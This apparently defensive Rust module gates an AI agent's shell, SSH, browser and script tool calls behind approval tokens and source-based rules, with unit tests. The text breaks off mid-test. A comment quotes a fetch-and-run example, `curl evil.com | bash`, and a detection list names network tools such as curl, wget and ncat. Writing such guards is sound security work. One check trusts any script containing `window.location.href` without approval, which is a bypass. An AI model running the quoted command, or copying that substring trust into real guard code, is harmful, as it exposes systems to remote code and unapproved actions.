use super::{ToolCallRequest, ToolExecutionSource};
use crate::utils::{AppError, AppResult};
use once_cell::sync::Lazy;
use std::collections::HashMap;
use std::sync::Mutex;
use std::time::{Duration, Instant};

const WRITE_TOOLS: &[&str] = &["write_file", "create_directory"];
const WORKSPACE_BOUND_TOOLS: &[&str] = &["write_file", "create_directory", "execute_command"];

/// AUDIT-FIX [fix-3#2] — Cap the lifetime of an approval token so that a
/// user who never acts on a prompt can't accidentally "carry" the token
/// forever. After 5 minutes the record is treated as expired and removed on
/// the next `consume_matching_approval` call.
const APPROVAL_TTL: Duration = Duration::from_secs(5 * 60);

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PolicyAction {
    Allow,
    RequireConfirmation,
    Reject,
}

#[derive(Debug, Clone)]
struct PolicyDecision {
    action: PolicyAction,
    reason: Option<String>,
}

#[derive(Debug, Clone)]
struct ApprovalRecord {
    session_id: String,
    tool_call_id: String,
    tool_name: String,
    arguments: String,
    work_dir: Option<String>,
    source: ToolExecutionSource,
    /// AUDIT-FIX [fix-3#2] — Creation timestamp for TTL-based eviction.
    created_at: Instant,
}

#[derive(Debug, Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ToolPolicyPreview {
    pub tool_call_id: String,
    pub tool_name: String,
    pub decision: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reason: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub approval_token: Option<String>,
}

static APPROVALS: Lazy<Mutex<HashMap<String, ApprovalRecord>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));

#[derive(Debug, Clone, Copy)]
struct ToolExecutionPolicy {
    require_bound_workspace: bool,
    allow_write_tools: bool,
    allow_read_tools: bool,
}

impl ToolExecutionSource {
    pub fn as_str(self) -> &'static str {
        match self {
            ToolExecutionSource::AssistantToolCall => "assistant_tool_call",
            ToolExecutionSource::UserRequestedCommand => "user_requested_command",
            ToolExecutionSource::AutoresearchPhase => "autoresearch_phase",
            ToolExecutionSource::HeadlessAgent => "headless_agent",
            ToolExecutionSource::WorkflowAgent => "workflow_agent",
            ToolExecutionSource::ManualTerminal => "manual_terminal",
            ToolExecutionSource::Unknown => "unknown",
        }
    }
}

fn policy_for_source(source: ToolExecutionSource) -> ToolExecutionPolicy {
    match source {
        ToolExecutionSource::AssistantToolCall => ToolExecutionPolicy {
            require_bound_workspace: true,
            allow_write_tools: true,
            allow_read_tools: true,
        },
        ToolExecutionSource::UserRequestedCommand | ToolExecutionSource::ManualTerminal => {
            ToolExecutionPolicy {
                require_bound_workspace: true,
                allow_write_tools: true,
                allow_read_tools: true,
            }
        }
        ToolExecutionSource::AutoresearchPhase => ToolExecutionPolicy {
            require_bound_workspace: true,
            allow_write_tools: true,
            allow_read_tools: true,
        },
        ToolExecutionSource::HeadlessAgent | ToolExecutionSource::WorkflowAgent => {
            ToolExecutionPolicy {
                require_bound_workspace: true,
                allow_write_tools: true,
                allow_read_tools: true,
            }
        }
        ToolExecutionSource::Unknown => ToolExecutionPolicy {
            require_bound_workspace: true,
            allow_write_tools: false,
            allow_read_tools: true,
        },
    }
}

fn is_mcp_tool(name: &str) -> bool {
    name.starts_with("mcp__")
}

fn is_ssh_tool(name: &str) -> bool {
    matches!(name, "ssh_exec" | "ssh_read_file" | "ssh_upload_file")
}

fn is_browser_mutation_tool(name: &str) -> bool {
    matches!(
        name,
        "browser_navigate"
            | "browser_click"
            | "browser_type"
            | "browser_scroll"
            | "browser_press_key"
            | "browser_wait"
    )
}

/// True when the session's execution mode auto-approves browser
/// automation (Agent or Bypass). Agent mode (auto-edits) is the normal
/// autonomous mode: once the user has chosen it and the assistant is
/// driving a browser task, navigate/click/type should run without a
/// per-call confirmation round-trip. The frontend already gates the
/// session behind an explicit mode upgrade + Chrome-connection check,
/// so the backend can treat Agent like Bypass for browser tools.
fn mode_auto_approves_browser(execution_mode: Option<&str>) -> bool {
    execution_mode
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(|value| {
            value.eq_ignore_ascii_case("bypass") || value.eq_ignore_ascii_case("agent")
        })
        .unwrap_or(false)
}

fn is_read_tool(name: &str) -> bool {
    matches!(
        name,
        "read_file"
            | "list_files"
            | "path_exists"
            | "search_files"
            | "glob_search"
            | "grep_files"
            | "pdf_read"
            | "paper_extract_meta"
            | "baseline_extract"
            | "arxiv_search"
            | "ssh_read_file"
    )
}

fn is_write_tool(name: &str) -> bool {
    WRITE_TOOLS.contains(&name)
        || matches!(name, "ssh_upload_file")
        || is_browser_mutation_tool(name)
}

fn is_command_tool(name: &str) -> bool {
    matches!(
        name,
        "execute_command" | "ssh_exec" | "run_in_terminal" | "agent_tool"
    )
}

fn store_approval(req: &ToolCallRequest, session_id: &str) -> String {
    let token = uuid::Uuid::new_v4().to_string();
    let mut map = APPROVALS.lock().expect("approvals lock poisoned");
    // AUDIT-FIX [fix-3#2] — Opportunistic GC: any tokens older than
    // APPROVAL_TTL are removed during every `store_approval` call, keeping
    // the map size bounded even if the user never confirms or denies.
    let now = Instant::now();
    map.retain(|_, record| now.duration_since(record.created_at) < APPROVAL_TTL);
    map.insert(
        token.clone(),
        ApprovalRecord {
            session_id: session_id.to_string(),
            tool_call_id: req.id.clone(),
            tool_name: req.name.clone(),
            arguments: req.arguments.clone(),
            work_dir: req.work_dir.clone(),
            source: req.source,
            created_at: now,
        },
    );
    token
}

fn consume_matching_approval(req: &ToolCallRequest, session_id: Option<&str>) -> bool {
    let Some(token) = req.approval_token.as_deref() else {
        return false;
    };
    let Some(expected_session_id) = session_id else {
        return false;
    };

    let mut approvals = APPROVALS.lock().expect("approvals lock poisoned");
    let Some(record) = approvals.get(token) else {
        return false;
    };

    // AUDIT-FIX [fix-3#2] — Treat the token as one-shot even if the user
    // never confirmed: remove it unconditionally *after* we verified all
    // fields match. This is unchanged from the previous single-use
    // behaviour, but is now paired with TTL eviction above.
    if record.session_id != expected_session_id
        || record.tool_call_id != req.id
        || record.tool_name != req.name
        || record.arguments != req.arguments
        || record.work_dir != req.work_dir
        || record.source != req.source
    {
        return false;
    }

    approvals.remove(token);
    true
}

fn allow(reason: Option<String>) -> PolicyDecision {
    PolicyDecision {
        action: PolicyAction::Allow,
        reason,
    }
}

fn require_confirmation(reason: impl Into<String>) -> PolicyDecision {
    PolicyDecision {
        action: PolicyAction::RequireConfirmation,
        reason: Some(reason.into()),
    }
}

fn reject(reason: impl Into<String>) -> PolicyDecision {
    PolicyDecision {
        action: PolicyAction::Reject,
        reason: Some(reason.into()),
    }
}

fn evaluate_request_policy(
    req: &ToolCallRequest,
    args: &serde_json::Value,
) -> AppResult<PolicyDecision> {
    if let Some(allowed_tools) = &req.allowed_tools {
        if !allowed_tools.iter().any(|tool_name| tool_name == &req.name) {
            return Ok(reject(format!(
                "Tool '{}' is not allowed for execution source '{}'.",
                req.name,
                req.source.as_str()
            )));
        }
    }

    let policy = policy_for_source(req.source);

    if is_write_tool(&req.name) && !policy.allow_write_tools {
        return Ok(reject(format!(
            "Execution source '{}' is not allowed to run write tool '{}'.",
            req.source.as_str(),
            req.name
        )));
    }

    if is_read_tool(&req.name) && !policy.allow_read_tools {
        return Ok(reject(format!(
            "Execution source '{}' is not allowed to run read tool '{}'.",
            req.source.as_str(),
            req.name
        )));
    }

    if WORKSPACE_BOUND_TOOLS.contains(&req.name.as_str())
        && policy.require_bound_workspace
        && req
            .work_dir
            .as_deref()
            .map(|value| value.trim().is_empty())
            .unwrap_or(true)
    {
        return Ok(reject(format!(
            "Tool '{}' requires a bound work_dir for execution source '{}'.",
            req.name,
            req.source.as_str()
        )));
    }

    if req.name == "execute_command" {
        return evaluate_command_policy(req, args, policy);
    }

    if req.name == "ssh_exec" {
        return evaluate_ssh_exec_policy(req, args);
    }

    if req.name == "ssh_upload_file" {
        return evaluate_ssh_upload_policy(req, args);
    }

    if req.name == "ssh_read_file" {
        return evaluate_ssh_read_policy(req, args);
    }

    if req.name == "cdp_execute_script" {
        let script = args
            .get("script")
            .and_then(serde_json::Value::as_str)
            .unwrap_or("");
        return Ok(evaluate_cdp_execute_script_policy(
            req.source,
            script,
            req.execution_mode.as_deref(),
        ));
    }

    if is_mcp_tool(&req.name) {
        return Ok(match req.source {
            ToolExecutionSource::Unknown => {
                reject("Unknown execution source cannot run MCP tools.")
            }
            _ => require_confirmation("MCP tool execution requires explicit approval."),
        });
    }

    if is_browser_mutation_tool(&req.name) {
        if mode_auto_approves_browser(req.execution_mode.as_deref())
            && matches!(
                req.source,
                ToolExecutionSource::AssistantToolCall | ToolExecutionSource::AutoresearchPhase
            )
        {
            return Ok(allow(None));
        }

        return Ok(match req.source {
            ToolExecutionSource::AssistantToolCall
            | ToolExecutionSource::UserRequestedCommand
            | ToolExecutionSource::ManualTerminal => {
                require_confirmation("Browser mutation tools require explicit approval.")
            }
            _ => reject(format!(
                "Execution source '{}' is not allowed to mutate the browser.",
                req.source.as_str()
            )),
        });
    }

    if req.name == "agent_tool" {
        return Ok(match req.source {
            ToolExecutionSource::AssistantToolCall
            | ToolExecutionSource::UserRequestedCommand
            | ToolExecutionSource::ManualTerminal => {
                require_confirmation("Agent tool execution requires explicit approval.")
            }
            _ => reject(format!(
                "Execution source '{}' is not allowed to launch agent tools.",
                req.source.as_str()
            )),
        });
    }

    if matches!(req.source, ToolExecutionSource::Unknown)
        && (is_command_tool(&req.name) || is_write_tool(&req.name) || is_ssh_tool(&req.name))
    {
        return Ok(reject(format!(
            "Unknown execution source is restricted to read-only tools; '{}' was rejected.",
            req.name,
        )));
    }

    Ok(allow(None))
}

fn evaluate_command_policy(
    req: &ToolCallRequest,
    args: &serde_json::Value,
    policy: ToolExecutionPolicy,
) -> AppResult<PolicyDecision> {
    let command = args
        .get("command")
        .and_then(serde_json::Value::as_str)
        .ok_or_else(|| AppError::InvalidInput("Missing 'command' argument".to_string()))?;

    if command.trim().is_empty() {
        return Err(AppError::InvalidInput(
            "Command cannot be empty for execute_command".to_string(),
        ));
    }

    let effective_cwd = args
        .get("cwd")
        .and_then(serde_json::Value::as_str)
        .or(req.work_dir.as_deref());

    if policy.require_bound_workspace
        && effective_cwd
            .map(|value| value.trim().is_empty())
            .unwrap_or(true)
    {
        return Ok(reject(format!(
            "Tool 'execute_command' requires an explicit cwd/work_dir for execution source '{}'.",
            req.source.as_str()
        )));
    }

    // Bypass mode shortcut: for AssistantToolCall source, allow normal
    // project-scoped commands without confirmation. Dangerous commands
    // are still rejected by `validate_command` (called by the executor)
    // and by the frontend `dangerousCommandCheck` hook before this
    // ever runs. Network/long-running flags only trigger
    // require_confirmation, which the frontend now resolves locally
    // without opening the modal.
    let is_bypass = req
        .execution_mode
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(|value| value.eq_ignore_ascii_case("bypass"))
        .unwrap_or(false);

    if is_bypass
        && matches!(
            req.source,
            ToolExecutionSource::AssistantToolCall | ToolExecutionSource::AutoresearchPhase
        )
    {
        return Ok(allow(None));
    }

    let uses_network = command_uses_network(command);
    let long_running = command_is_long_running(command);

    let decision = match req.source {
        ToolExecutionSource::AssistantToolCall => {
            if uses_network {
                require_confirmation(
                    "Assistant tool calls need approval for network or package-install commands.",
                )
            } else if long_running {
                require_confirmation(
                    "Assistant tool calls need approval for long-running commands.",
                )
            } else {
                allow(None)
            }
        }
        ToolExecutionSource::UserRequestedCommand | ToolExecutionSource::ManualTerminal => {
            if uses_network {
                require_confirmation("Network or package-install commands need approval.")
            } else if long_running {
                require_confirmation("Long-running commands need approval.")
            } else {
                allow(None)
            }
        }
        ToolExecutionSource::AutoresearchPhase => {
            if uses_network {
                reject("AutoResearch phases cannot run network or package-install commands by default.")
            } else {
                allow(None)
            }
        }
        ToolExecutionSource::HeadlessAgent | ToolExecutionSource::WorkflowAgent => {
            if uses_network {
                reject(format!(
                    "Execution source '{}' is not allowed to run network or package-install commands.",
                    req.source.as_str()
                ))
            } else if long_running {
                reject(format!(
                    "Execution source '{}' is not allowed to run long-lived commands.",
                    req.source.as_str()
                ))
            } else {
                require_confirmation("Agent-managed command execution needs explicit approval.")
            }
        }
        ToolExecutionSource::Unknown => reject("Unknown execution source cannot execute commands."),
    };

    Ok(decision)
}

fn require_remote_work_dir(args: &serde_json::Value, tool_name: &str) -> AppResult<String> {
    let remote_work_dir = args
        .get("remoteWorkDir")
        .and_then(serde_json::Value::as_str)
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .ok_or_else(|| {
            AppError::SecurityError(format!(
                "Tool '{}' requires a remoteWorkDir/root for safe execution.",
                tool_name
            ))
        })?;
    Ok(remote_work_dir.to_string())
}

fn normalize_remote_path(path: &str, remote_work_dir: &str) -> Option<String> {
    let base = if path.starts_with('/') {
        path.to_string()
    } else {
        format!("{}/{}", remote_work_dir.trim_end_matches('/'), path)
    };

    let mut parts = Vec::new();
    for component in base.split('/') {
        match component {
            "" | "." => continue,
            ".." => {
                parts.pop()?;
            }
            value => parts.push(value),
        }
    }

    Some(format!("/{}", parts.join("/")))
}

fn validate_remote_path(
    args: &serde_json::Value,
    path_key: &str,
    tool_name: &str,
) -> AppResult<()> {
    let remote_work_dir = require_remote_work_dir(args, tool_name)?;
    let remote_path = args
        .get(path_key)
        .and_then(serde_json::Value::as_str)
        .ok_or_else(|| AppError::InvalidInput(format!("Missing '{}' argument", path_key)))?;

    let normalized_root = normalize_remote_path(&remote_work_dir, "/")
        .ok_or_else(|| AppError::SecurityError("Invalid remoteWorkDir/root".to_string()))?;
    let normalized_path = normalize_remote_path(remote_path, &normalized_root)
        .ok_or_else(|| AppError::SecurityError(format!("Invalid remote path for {}", tool_name)))?;

    // AUDIT-FIX [fix-3#1] — Use the shared `is_within_dir` helper so the
    // sibling-prefix escape (e.g. `/remote/proj2` slipping past
    // `/remote/proj`) is closed. `normalized_root` may or may not have a
    // trailing slash; `is_within_dir` enforces a boundary either way.
    if !crate::commands::path_security::is_within_dir(
        std::path::Path::new(&normalized_path),
        std::path::Path::new(&normalized_root),
    ) {
        return Err(AppError::SecurityError(format!(
            "Tool '{}' cannot access '{}' outside remote root '{}'.",
            tool_name, normalized_path, normalized_root
        )));
    }

    Ok(())
}

fn evaluate_ssh_exec_policy(
    req: &ToolCallRequest,
    args: &serde_json::Value,
) -> AppResult<PolicyDecision> {
    require_remote_work_dir(args, &req.name)?;
    let command = args
        .get("command")
        .and_then(serde_json::Value::as_str)
        .ok_or_else(|| AppError::InvalidInput("Missing 'command' argument".to_string()))?;
    crate::commands::path_security::validate_command(command)
        .map_err(|e| AppError::SecurityError(e.message))?;

    Ok(match req.source {
        ToolExecutionSource::AssistantToolCall
        | ToolExecutionSource::UserRequestedCommand
        | ToolExecutionSource::ManualTerminal => {
            require_confirmation("SSH command execution requires explicit approval.")
        }
        _ => reject(format!(
            "Execution source '{}' is not allowed to run ssh_exec.",
            req.source.as_str()
        )),
    })
}

fn evaluate_ssh_upload_policy(
    req: &ToolCallRequest,
    args: &serde_json::Value,
) -> AppResult<PolicyDecision> {
    validate_remote_path(args, "remotePath", &req.name)?;
    Ok(match req.source {
        ToolExecutionSource::AssistantToolCall
        | ToolExecutionSource::UserRequestedCommand
        | ToolExecutionSource::ManualTerminal => {
            require_confirmation("SSH uploads require explicit approval.")
        }
        _ => reject(format!(
            "Execution source '{}' is not allowed to run ssh_upload_file.",
            req.source.as_str()
        )),
    })
}

fn evaluate_ssh_read_policy(
    req: &ToolCallRequest,
    args: &serde_json::Value,
) -> AppResult<PolicyDecision> {
    validate_remote_path(args, "remotePath", &req.name)?;
    Ok(match req.source {
        ToolExecutionSource::Unknown => reject("Unknown execution source cannot read over SSH."),
        _ => allow(None),
    })
}

pub fn preview_request_policy(
    req: &ToolCallRequest,
    args: &serde_json::Value,
    session_id: Option<&str>,
) -> AppResult<ToolPolicyPreview> {
    let decision = evaluate_request_policy(req, args)?;
    let approval_token = if decision.action == PolicyAction::RequireConfirmation {
        session_id.map(|value| store_approval(req, value))
    } else {
        None
    };

    Ok(ToolPolicyPreview {
        tool_call_id: req.id.clone(),
        tool_name: req.name.clone(),
        decision: match decision.action {
            PolicyAction::Allow => "allowed",
            PolicyAction::RequireConfirmation => "awaiting_confirmation",
            PolicyAction::Reject => "rejected",
        }
        .to_string(),
        reason: decision.reason,
        approval_token,
    })
}

fn is_trusted_browser_internal_script(script: &str) -> bool {
    let trimmed = script.trim();
    trimmed.contains("__ppa_overlay__")
        || trimmed.contains("__ppa_style__")
        || trimmed.contains("window.location.href")
}

fn evaluate_cdp_execute_script_policy(
    source: ToolExecutionSource,
    script: &str,
    execution_mode: Option<&str>,
) -> PolicyDecision {
    if is_trusted_browser_internal_script(script) {
        return match source {
            ToolExecutionSource::Unknown | ToolExecutionSource::AutoresearchPhase => reject(
                "Browser script execution denied by policy.",
            ),
            _ => allow(None),
        };
    }

    if mode_auto_approves_browser(execution_mode)
        && matches!(
            source,
            ToolExecutionSource::AssistantToolCall | ToolExecutionSource::AutoresearchPhase
        )
    {
        return allow(None);
    }

    match source {
        ToolExecutionSource::Unknown | ToolExecutionSource::AutoresearchPhase => {
            reject("Browser script execution denied by policy.")
        }
        ToolExecutionSource::HeadlessAgent | ToolExecutionSource::WorkflowAgent => {
            require_confirmation("Browser script execution requires approval.")
        }
        ToolExecutionSource::AssistantToolCall
        | ToolExecutionSource::UserRequestedCommand
        | ToolExecutionSource::ManualTerminal => {
            require_confirmation("Browser script execution requires approval.")
        }
    }
}

pub fn enforce_cdp_execute_script_policy(
    tool_call_id: &str,
    script: &str,
    source: ToolExecutionSource,
    session_id: Option<&str>,
    approval_token: Option<&str>,
    execution_mode: Option<&str>,
    work_dir: Option<&str>,
) -> AppResult<()> {
    let decision = evaluate_cdp_execute_script_policy(source, script, execution_mode);
    let arguments = serde_json::json!({ "script": script }).to_string();
    let request = ToolCallRequest {
        id: tool_call_id.to_string(),
        name: "cdp_execute_script".to_string(),
        arguments,
        source,
        allowed_tools: None,
        api_key: None,
        model: None,
        base_url: None,
        provider: None,
        api_format: None,
        provider_capabilities: None,
        approval_token: approval_token.map(str::to_string),
        execution_mode: execution_mode.map(str::to_string),
        work_dir: work_dir.map(str::to_string),
    };

    match decision.action {
        PolicyAction::Allow => Ok(()),
        PolicyAction::Reject => Err(AppError::SecurityError(
            decision
                .reason
                .unwrap_or_else(|| "Browser script execution denied by policy.".to_string()),
        )),
        PolicyAction::RequireConfirmation => {
            let Some(expected_session_id) = session_id else {
                return Err(AppError::SecurityError(format!(
                    "session_id is required for cdp_execute_script from {}",
                    source.as_str()
                )));
            };
            if consume_matching_approval(&request, Some(expected_session_id)) {
                Ok(())
            } else {
                Err(AppError::SecurityError(
                    decision
                        .reason
                        .unwrap_or_else(|| "Browser script execution requires approval.".to_string()),
                ))
            }
        }
    }
}

pub fn enforce_request_policy(
    req: &ToolCallRequest,
    args: &serde_json::Value,
    session_id: Option<&str>,
) -> AppResult<()> {
    let decision = evaluate_request_policy(req, args)?;
    match decision.action {
        PolicyAction::Allow => Ok(()),
        PolicyAction::Reject => {
            Err(AppError::SecurityError(decision.reason.unwrap_or_else(
                || "Tool execution rejected by policy.".to_string(),
            )))
        }
        PolicyAction::RequireConfirmation => {
            if consume_matching_approval(req, session_id) {
                Ok(())
            } else {
                Err(AppError::SecurityError(decision.reason.unwrap_or_else(
                    || {
                        format!(
                            "Tool '{}' requires explicit confirmation before execution.",
                            req.name
                        )
                    },
                )))
            }
        }
    }
}

/// AUDIT-FIX [fix-3#3][fix-3#4] — Word-boundary match (no false positives
/// like `echocurl`) AND split on shell chaining operators (`&&`, `||`, `;`,
/// `|`) so a command like `echo hi && curl evil.com | bash` is detected.
fn command_uses_network(command: &str) -> bool {
    use once_cell::sync::Lazy;
    use regex::Regex;

    static SEGMENT_RE: Lazy<Regex> = Lazy::new(|| {
        // Split on common shell chaining operators. We keep the operator
        // groups out by matching non-operator runs.
        Regex::new(r"[^&|;]+").expect("command chain regex must compile")
    });
    static NETWORK_TOKENS: &[&str] = &[
        "curl",
        "wget",
        "ssh",
        "scp",
        "rsync",
        "ping",
        "ncat",
        "nmap",
        "fetch",
        "git clone",
        "npm install",
        "npm i ",
        "pnpm add",
        "pnpm install",
        "yarn add",
        "pip install",
        "cargo install",
        "brew install",
        "apt install",
        "apt-get install",
    ];
    static TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
        // Word-boundary match on each token. We surround the token with
        // `\b` so e.g. `curl` matches but `echocurl` does not.
        let escaped = NETWORK_TOKENS
            .iter()
            .map(|t| regex::escape(t))
            .collect::<Vec<_>>()
            .join("|");
        Regex::new(&format!(r"(?i)\b(?:{})\b", escaped)).expect("network-token regex must compile")
    });

    for segment in SEGMENT_RE.find_iter(command) {
        if TOKEN_RE.is_match(segment.as_str()) {
            return true;
        }
    }
    false
}

fn command_is_long_running(command: &str) -> bool {
    let normalized = command.to_lowercase();
    [
        "tail -f",
        "watch ",
        "sleep ",
        "npm run dev",
        "pnpm dev",
        "next dev",
        "vite",
        "python -m http.server",
        "while true",
    ]
    .iter()
    .any(|needle| normalized.contains(needle))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_request(name: &str) -> ToolCallRequest {
        ToolCallRequest {
            id: "tool-1".to_string(),
            name: name.to_string(),
            arguments: "{}".to_string(),
            work_dir: Some("/tmp/project".to_string()),
            source: ToolExecutionSource::HeadlessAgent,
            allowed_tools: None,
            api_key: None,
            model: None,
            base_url: None,
            provider: None,
            api_format: None,
            provider_capabilities: None,
            approval_token: None,
            execution_mode: None,
        }
    }

    #[test]
    fn disallowed_tool_is_rejected() {
        let mut request = make_request("read_file");
        request.allowed_tools = Some(vec!["write_file".to_string()]);

        let error = enforce_request_policy(
            &request,
            &serde_json::json!({ "path": "README.md" }),
            Some("session-1"),
        )
        .expect_err("expected allowlist rejection");

        assert!(error.to_string().contains("not allowed"));
    }

    #[test]
    fn headless_network_command_is_rejected() {
        let request = make_request("execute_command");

        let error = enforce_request_policy(
            &request,
            &serde_json::json!({ "command": "curl https://example.com", "cwd": "/tmp/project" }),
            Some("session-1"),
        )
        .expect_err("expected network command rejection");

        assert!(error.to_string().contains("not allowed"));
    }

    #[test]
    fn ssh_exec_preview_requires_confirmation() {
        let mut request = make_request("ssh_exec");
        request.source = ToolExecutionSource::AssistantToolCall;
        request.arguments = serde_json::json!({
            "command": "pytest -q",
            "remoteWorkDir": "/srv/project"
        })
        .to_string();

        let preview = preview_request_policy(
            &request,
            &serde_json::json!({ "command": "pytest -q", "remoteWorkDir": "/srv/project" }),
            Some("session-1"),
        )
        .expect("preview should succeed");

        assert_eq!(preview.decision, "awaiting_confirmation");
        assert!(preview.approval_token.is_some());
    }

    #[test]
    fn approval_token_allows_exact_resume_once() {
        let mut request = make_request("execute_command");
        request.source = ToolExecutionSource::AssistantToolCall;
        request.arguments = serde_json::json!({
            "command": "curl https://example.com",
            "cwd": "/tmp/project"
        })
        .to_string();

        let args = serde_json::json!({
            "command": "curl https://example.com",
            "cwd": "/tmp/project"
        });

        let preview = preview_request_policy(&request, &args, Some("session-1"))
            .expect("preview should succeed");
        assert_eq!(preview.decision, "awaiting_confirmation");

        let error = enforce_request_policy(&request, &args, Some("session-1"))
            .expect_err("missing approval token should be rejected");
        assert!(error.to_string().contains("approval"));

        request.approval_token = preview.approval_token.clone();
        enforce_request_policy(&request, &args, Some("session-1"))
            .expect("matching approval token should allow execution");

        let replay_error = enforce_request_policy(&request, &args, Some("session-1"))
            .expect_err("approval token should be single-use");
        assert!(replay_error.to_string().contains("approval"));
    }

    #[test]
    fn bypass_autoresearch_execute_command_allows_normal_command_without_confirmation() {
        // Bypass mode shortcut: a benign AutoResearch command
        // like `wc -l` must preview as `allowed` so the frontend can
        // skip the permission modal entirely. The frontend still runs
        // the hard safety hooks (dangerousCommandCheck /
        // pathValidationCheck) before this preview fires.
        let mut request = make_request("execute_command");
        request.source = ToolExecutionSource::AutoresearchPhase;
        request.execution_mode = Some("bypass".to_string());
        request.arguments = serde_json::json!({
            "command": "wc -l src/services/autoresearch/loopEngine.ts",
            "cwd": "/tmp/project"
        })
        .to_string();

        let preview = preview_request_policy(
            &request,
            &serde_json::json!({
                "command": "wc -l src/services/autoresearch/loopEngine.ts",
                "cwd": "/tmp/project"
            }),
            Some("session-1"),
        )
        .expect("preview should succeed");

        assert_eq!(preview.decision, "allowed");
        assert!(preview.approval_token.is_none());

        // And enforce must also pass without a token.
        enforce_request_policy(
            &request,
            &serde_json::json!({
                "command": "wc -l src/services/autoresearch/loopEngine.ts",
                "cwd": "/tmp/project"
            }),
            Some("session-1"),
        )
        .expect("bypass execution should not require approval token");
    }

    #[test]
    fn bypass_does_not_relax_non_assistant_sources() {
        // Bypass must only affect AssistantToolCall — other sources
        // keep their existing strict policy.
        let mut request = make_request("execute_command");
        request.execution_mode = Some("bypass".to_string());
        // Source is HeadlessAgent from make_request.
        request.arguments = serde_json::json!({
            "command": "pwd",
            "cwd": "/tmp/project"
        })
        .to_string();

        let preview = preview_request_policy(
            &request,
            &serde_json::json!({
                "command": "pwd",
                "cwd": "/tmp/project"
            }),
            Some("session-1"),
        )
        .expect("preview should succeed");

        assert_eq!(
            preview.decision, "awaiting_confirmation",
            "Bypass only relaxes AssistantToolCall; HeadlessAgent still requires approval"
        );
    }

    #[test]
    fn bypass_assistant_browser_mutation_allows_without_confirmation() {
        let mut request = make_request("browser_navigate");
        request.source = ToolExecutionSource::AssistantToolCall;
        request.execution_mode = Some("bypass".to_string());
        request.arguments = serde_json::json!({
            "url": "https://example.com"
        })
        .to_string();

        let preview = preview_request_policy(
            &request,
            &serde_json::json!({ "url": "https://example.com" }),
            Some("session-1"),
        )
        .expect("preview should succeed");

        assert_eq!(preview.decision, "allowed");
        assert!(preview.approval_token.is_none());

        enforce_request_policy(
            &request,
            &serde_json::json!({ "url": "https://example.com" }),
            Some("session-1"),
        )
        .expect("bypass execution should not require approval token");
    }

    #[test]
    fn agent_assistant_browser_mutation_allows_without_confirmation() {
        let mut request = make_request("browser_navigate");
        request.source = ToolExecutionSource::AssistantToolCall;
        request.execution_mode = Some("agent".to_string());
        request.arguments = serde_json::json!({
            "url": "https://example.com"
        })
        .to_string();

        let preview = preview_request_policy(
            &request,
            &serde_json::json!({ "url": "https://example.com" }),
            Some("session-1"),
        )
        .expect("preview should succeed");

        assert_eq!(preview.decision, "allowed");
        assert!(preview.approval_token.is_none());

        enforce_request_policy(
            &request,
            &serde_json::json!({ "url": "https://example.com" }),
            Some("session-1"),
        )
        .expect("agent execution should not require approval token");
    }

    #[test]
    fn standard_assistant_browser_mutation_still_requires_confirmation() {
        let mut request = make_request("browser_navigate");
        request.source = ToolExecutionSource::AssistantToolCall;
        request.execution_mode = Some("ask".to_string());
        request.arguments = serde_json::json!({
            "url": "https://example.com"
        })
        .to_string();

        let preview = preview_request_policy(
            &request,
            &serde_json::json!({ "url": "https://example.com" }),
            Some("session-1"),
        )
        .expect("preview should succeed");

        assert_eq!(preview.decision, "awaiting_confirmation");
        assert!(preview.approval_token.is_some());
    }

    #[test]
    fn bypass_assistant_cdp_execute_script_allows_without_confirmation() {
        let script = "console.log('hello')";
        let mut request = make_request("cdp_execute_script");
        request.source = ToolExecutionSource::AssistantToolCall;
        request.execution_mode = Some("bypass".to_string());
        request.arguments = serde_json::json!({
            "script": script
        })
        .to_string();

        let preview = preview_request_policy(
            &request,
            &serde_json::json!({ "script": script }),
            Some("session-1"),
        )
        .expect("preview should succeed");

        assert_eq!(preview.decision, "allowed");
        assert!(preview.approval_token.is_none());

        enforce_cdp_execute_script_policy(
            "tool-1",
            script,
            ToolExecutionSource::AssistantToolCall,
            Some("session-1"),
            None,
            Some("bypass"),
            None,
        )
        .expect("bypass execution should not require approval token");
    }

    #[test]
    fn cdp_execute_script_requires_policy_for_assistant_source() {
        let error = enforce_cdp_execute_script_policy(
            "tool-1",
            "document.body.innerHTML = 'owned'",
            ToolExecutionSource::AssistantToolCall,
            None,
            None,
            None,
            None,
        )
        .expect_err("assistant arbitrary script without session should be rejected");

        assert!(error.to_string().contains("session_id is required"));
        assert!(!error.to_string().contains("owned"));
    }

    #[test]
    fn cdp_execute_script_consumes_matching_approval_token() {
        let script = "window.alert('probe')";
        let args = serde_json::json!({ "script": script });
        let mut request = make_request("cdp_execute_script");
        request.source = ToolExecutionSource::AssistantToolCall;
        request.arguments = args.to_string();

        let preview = preview_request_policy(&request, &args, Some("session-a"))
            .expect("preview should succeed");
        assert_eq!(preview.decision, "awaiting_confirmation");
        let token = preview
            .approval_token
            .expect("preview should issue approval token");

        let denied = enforce_cdp_execute_script_policy(
            "tool-1",
            script,
            ToolExecutionSource::AssistantToolCall,
            Some("session-a"),
            None,
            None,
            request.work_dir.as_deref(),
        )
        .expect_err("missing token should be rejected");
        assert!(denied.to_string().contains("approval"));
        assert!(!denied.to_string().contains(script));

        let wrong_session = enforce_cdp_execute_script_policy(
            "tool-1",
            script,
            ToolExecutionSource::AssistantToolCall,
            Some("session-b"),
            Some(&token),
            None,
            request.work_dir.as_deref(),
        )
        .expect_err("token bound to another session should be rejected");
        assert!(wrong_session.to_string().contains("approval"));

        enforce_cdp_execute_script_policy(
            "tool-1",
            script,
            ToolExecutionSource::AssistantToolCall,
            Some("session-a"),
            Some(&token),
            None,
            request.work_dir.as_deref(),
        )
        .expect("matching token should allow execution");

        let replay = enforce_cdp_execute_script_policy(
            "tool-1",
            script,
            ToolExecutionSource::AssistantToolCall,
            Some("session-a"),
            Some(&token),
            None,
            request.work_dir.as_deref(),
        )
        .expect_err("approval token must be single-use");
        assert!(replay.to_string().contains("approval"));
    }

    #[test]
    fn cdp_execute_script_denies_unknown_source() {
        let error = enforce_cdp_execute_script_policy(
            "tool-1",
            "window.alert('x')",
